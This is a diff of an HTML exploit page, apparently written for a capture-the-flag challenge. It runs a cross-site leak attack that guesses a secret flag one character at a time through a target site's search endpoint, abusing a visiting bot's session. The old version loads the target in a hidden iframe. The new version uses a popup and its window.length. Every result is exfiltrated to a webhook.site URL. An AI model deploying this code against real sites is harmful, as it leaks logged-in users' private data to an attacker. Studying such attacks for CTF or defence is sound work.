@@ -1,9 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>.</title>
-</head>
+<head><meta charset="utf-8"><title>.</title></head>
 <body>
 <script>
 const WEBHOOK = 'https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c';
@@ -11,7 +8,6 @@ const TARGET  = 'https://wonder.cbd2026.cloud';
 
 function exfil(data) {
   const url = WEBHOOK + '?' + new URLSearchParams(data).toString();
-  // three methods for reliability
   navigator.sendBeacon(url);
   new Image().src = url;
   fetch(url, { mode: 'no-cors' }).catch(() => {});
@@ -21,56 +17,38 @@ function getParam(k) {
   return new URLSearchParams(location.search).get(k) || '';
 }
 
-const guess = getParam('g');   // e.g. FLAG{a
-const idx   = getParam('i');   // char index for logging
+const guess = getParam('g');
+const idx   = getParam('i');
 
 if (!guess) {
   document.body.innerText = 'missing ?g= param';
 } else {
   exfil({ status: 'loading', guess, idx });
 
-  const iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;';
-  iframe.src = TARGET + '/search?q=' + encodeURIComponent(guess);
+  const win = window.open(
+    TARGET + '/search?q=' + encodeURIComponent(guess),
+    '_blank',
+    'width=1,height=1'
+  );
 
-  iframe.onload = function() {
-    let size = 0;
-    let html = '';
-    try {
-      html = iframe.contentDocument.documentElement.innerHTML;
-      size = html.length;
-    } catch(e) {
-      // same-origin policy blocked — shouldn't happen since target is same origin as bot session
-      exfil({ status: 'cors_blocked', guess, idx, err: e.message });
-      return;
-    }
-
-    // Count <article class="pdf-card"> occurrences
-    // 1 match = only our decoy = wrong char
-    // 2 matches = decoy + admin private PDF = CORRECT char
-    const cards = (html.match(/pdf-card/g) || []).length;
-
-    // Also grab the page size as a secondary signal
-    exfil({
-      status: 'done',
-      guess,
-      idx,
-      cards,
-      size,
-      hit: cards >= 2 ? '1' : '0'
-    });
-  };
-
-  iframe.onerror = function() {
-    exfil({ status: 'iframe_error', guess, idx });
-  };
-
-  document.body.appendChild(iframe);
-
-  // Fallback timeout exfil
   setTimeout(() => {
-    exfil({ status: 'timeout', guess, idx });
-  }, 8000);
+    try {
+      // window.length = jumlah iframe/frame di halaman
+      // kalau PDF di-embed → muncul <iframe> → length > 0
+      const len = win.length;
+      exfil({
+        status: 'done',
+        guess,
+        idx,
+        win_length: len,
+        hit: len > 0 ? '1' : '0'
+      });
+    } catch(e) {
+      exfil({ status: 'error', guess, idx, err: e.message });
+    } finally {
+      win.close();
+    }
+  }, 3000);
 }
 </script>
 </body>
